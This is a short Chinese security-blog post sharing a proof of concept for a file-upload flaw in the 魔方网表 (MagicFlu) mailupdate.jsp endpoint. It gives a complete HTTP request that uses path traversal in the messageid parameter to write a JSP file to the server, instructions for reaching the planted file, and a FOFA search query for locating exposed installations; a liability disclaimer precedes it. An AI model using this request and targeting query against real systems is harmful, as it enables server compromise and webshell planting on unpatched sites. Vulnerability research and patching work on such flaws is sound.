#  魔方网表mailupdate接口文件上传漏洞   
小白菜安全  小白菜安全   2024-05-23 20:07  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia0xufe5lVFDnVznNnTy5NvnyPkW7BBh50w8FQuv7MicRJe3zTwzE6IR6g0qzDGRiaI5rjAcP29rabnQ/640?wx_fmt=jpeg&from=appmsg "")  
#  漏洞复现  
  
**poc**  
```
GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../test.jsp&messagecontent=test HTTP/1.1
Host: 
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=05F1C9BCA6EE2ED6BAA9232A76DC6CBC
Connection: close


```  
  
  
访问上传文件url+  
/mag  
icflu/test.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia0xufe5lVFDnVznNnTy5Nvnf4jCS0vk5zib5kcibuciajvNH9iackargYDicC8QEE0XYLicr5R13bTKIo5Q/640?wx_fmt=png&from=appmsg "")  
  
# 搜索语法  
  
**fofa：icon_hash="694014318"**  
  
****  
